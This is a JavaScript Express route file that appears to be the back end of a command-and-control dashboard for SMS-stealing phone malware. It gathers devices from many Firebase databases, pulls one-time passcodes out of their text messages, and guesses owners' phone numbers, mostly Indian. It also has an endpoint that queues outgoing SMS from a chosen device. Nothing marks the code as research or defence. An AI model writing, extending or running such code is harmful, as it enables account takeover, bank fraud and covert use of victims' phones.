"use strict";

/**
 * Dashboard routes.
 * Aggregates data from all active Firebase connections for the user dashboard.
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");
const { requireAuth } = require("../middleware/auth");

const router = Router();
router.use(requireAuth);

/**
 * GET /api/dashboard
 * Full dashboard data: all devices + recent OTPs from all connections.
 */
router.get("/", async (req, res, next) => {
  try {
    const connections = await ConnectionsService.getAllActive();

    // Fetch devices from all connections in parallel
    const deviceResults = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const clientsData = await FirebaseService.read(conn.url, conn.key, "clients");
          const devices = DeviceService.parseAll(clientsData);
          return devices.map((d) => ({ ...d, source: conn.name }));
        } catch {
          return [];
        }
      })
    );

    // Flatten all devices
    const allDevices = [];
    for (const result of deviceResults) {
      if (result.status === "fulfilled") allDevices.push(...result.value);
    }

    // Sort: online first
    allDevices.sort((a, b) => {
      if (a.status !== b.status) return a.status ? -1 : 1;
      return a.name.localeCompare(b.name);
    });

    // Fetch recent OTPs from all connections
    const otpResults = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);
          const devices = DeviceService.parseAll(clientsData);
          const otps = [];
          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;
              const device = devices.find((d) => d.id === deviceId) || { id: deviceId };
              const msgArray = Object.values(deviceMessages);

              // Extract phone — same logic as OTP route (prepend 91 for Indian numbers)
              let phone = getPhone(device, clientsData?.[deviceId], msgArray);

              for (const [, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;
                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;
                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;
                const rawTs = msg.timestamp || msg.time || msg.date || "";
                otps.push({
                  service: extracted.service,
                  phone: OtpExtractor.maskPhone(phone),
                  code: extracted.code,
                  message: text.trim().slice(0, 200),
                  timestamp: rawTs ? (typeof rawTs === "number" ? new Date(rawTs).toISOString() : String(rawTs)) : new Date().toISOString(),
                  country: OtpExtractor.detectCountry(phone),
                  source: conn.name,
                });
              }
            }
          }
          return otps;
        } catch { return []; }
      })
    );

    const allOtps = [];
    for (const r of otpResults) {
      if (r.status === "fulfilled") allOtps.push(...r.value);
    }
    allOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    res.json({
      success: true,
      devices: {
        total: allDevices.length,
        online: allDevices.filter((d) => d.status).length,
        list: allDevices,
      },
      otps: {
        total: allOtps.length,
        recent: allOtps.slice(0, 50),
      },
      connections: connections.length,
    });
  } catch (err) {
    next(err);
  }
});

/**
 * GET /api/dashboard/devices/:id
 * Get device details from any connected database.
 */
router.get("/devices/:id", async (req, res, next) => {
  try {
    const connections = await ConnectionsService.getAllActive();
    const { id } = req.params;

    for (const conn of connections) {
      try {
        const raw = await FirebaseService.read(conn.url, conn.key, `clients/${id}`);
        if (raw) {
          const device = DeviceService.normalize(id, raw);
          const messages = await FirebaseService.read(conn.url, conn.key, `messages/${id}`).catch(() => null);
          return res.json({
            success: true,
            device: { ...device, source: conn.name },
            messages: messages ? DeviceService.parseMessages(messages) : [],
          });
        }
      } catch { /* try next connection */ }
    }

    res.status(404).json({ error: "Device not found in any connected database" });
  } catch (err) {
    next(err);
  }
});

/**
 * POST /api/dashboard/devices/:id/sms
 * Send SMS from a device.
 */
router.post("/devices/:id/sms", async (req, res, next) => {
  try {
    const { to, message } = req.body;
    if (!to || !message) return res.status(400).json({ error: "to and message required" });

    const connections = await ConnectionsService.getAllActive();
    const { id } = req.params;

    for (const conn of connections) {
      try {
        const raw = await FirebaseService.read(conn.url, conn.key, `clients/${id}`);
        if (raw) {
          await FirebaseService.write(conn.url, conn.key, `clients/${id}/webhookEvent/sendSms`, {
            from: 1, to, message, isSended: false,
          });
          return res.json({ success: true, message: "SMS queued" });
        }
      } catch { /* try next */ }
    }

    res.status(404).json({ error: "Device not found" });
  } catch (err) {
    next(err);
  }
});

module.exports = router;

// ═══ Helpers ═══════════════════════════════════════════════

function getPhone(device, rawClient, messages) {
  const candidates = [
    device?.phoneNumber, device?.phone, device?.number,
    device?.mobileNumber, device?.mobile, device?.simNumber,
  ];
  if (rawClient) {
    candidates.push(
      rawClient.phoneNumber, rawClient.phone, rawClient.number,
      rawClient.mobileNumber, rawClient.mobile, rawClient.phoneNo,
      rawClient.contactNumber, rawClient.simNumber, rawClient.sim,
      rawClient.registeredNumber, rawClient.devicePhone,
    );
  }
  if (messages && Array.isArray(messages)) {
    for (const msg of messages) {
      const text = msg.text || msg.body || msg.message || "";
      const indianMatch = text.match(/(?:\+91|91)?[\s-]?([6-9]\d{9})/);
      if (indianMatch) candidates.push(indianMatch[1]);
      const intlMatch = text.match(/\+?(\d{10,15})/);
      if (intlMatch) candidates.push(intlMatch[1]);
    }
  }
  for (const c of candidates) {
    if (!c || c === "—") continue;
    const digits = String(c).replace(/[^0-9]/g, "");
    if (digits.length >= 10) {
      if (digits.length === 10 && /^[6-9]/.test(digits)) return "91" + digits;
      return digits;
    }
  }
  return "";
}
